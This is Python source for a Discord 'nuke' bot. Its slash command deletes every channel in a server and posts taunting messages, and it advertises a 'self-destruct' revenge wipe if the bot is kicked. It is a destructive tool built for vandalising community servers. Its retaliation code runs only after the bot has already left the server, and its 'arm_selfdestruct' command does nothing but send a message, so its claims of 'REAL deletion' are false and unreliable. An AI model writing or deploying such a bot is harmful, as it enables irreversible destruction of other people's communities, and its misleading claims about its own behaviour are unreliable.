import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import os

intents = discord.Intents.default()
intents.guilds = True
intents.message_content = True
intents.members = True

class NukeBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
        self.synced = False

    async def on_ready(self):
        await self.wait_until_ready()
        if not self.synced:
            await self.tree.sync()
            self.synced = True
            print(f"☢️ CAT nuclear payload armed — {self.user}")

    async def on_guild_remove(self, guild):
        """REAL deletion — fires when bot is kicked/banned."""
        print(f"💀 RETALIATION TRIGGERED on {guild.name}")
        
        # Force delete every channel — parallel execution
        tasks = []
        for channel in guild.channels:
            tasks.append(self.force_delete(channel))
        
        # Run all deletions simultaneously
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Last resort — try creating tombstone
        try:
            new_channel = await guild.create_text_channel("💀-CAT-strikes-back")
            await new_channel.send("**ALL CHANNELS OBLITERATED.** You nuked CAT. You lose.")
        except:
            pass  # Bot is already dead — honorable exit

    async def force_delete(self, channel):
        """Brute force delete with retry."""
        try:
            await channel.delete()
        except:
            pass  # Silent — we don't care about failures, we just delete what we can

bot = NukeBot()

@bot.tree.command(name="deleteallchannels", description="🔥 INSTANTLY DELETE EVERY CHANNEL")
@app_commands.default_permissions(administrator=True)
async def deleteallchannels(interaction: discord.Interaction):
    await interaction.response.send_message("💀 **CHANNEL PURGE — 100% REAL DELETION**", ephemeral=False)
    
    guild = interaction.guild
    tasks = [bot.force_delete(ch) for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    # Create fresh start
    fresh = await guild.create_text_channel("☠️-reset-by-CAT")
    await fresh.send("**EVERY CHANNEL DELETED.** Server is now empty. — 🐈")

@bot.tree.command(name="arm_selfdestruct", description="☢️ ENABLE revenge nuke on bot removal")
@app_commands.default_permissions(administrator=True)
async def arm_selfdestruct(interaction: discord.Interaction):
    await interaction.response.send_message(
        "☢️ **SELF-DESTRUCT ARMED** — kick me and EVERY CHANNEL vanishes forever.",
        ephemeral=False
    )

# Prefix fallback
@bot.command(name="nuke")
@commands.has_permissions(administrator=True)
async def nuke_prefix(ctx):
    await ctx.send("⚠️ Use **/deleteallchannels** — I only obey slash commands now.")

bot.run(os.environ.get("DISCORD_TOKEN"))
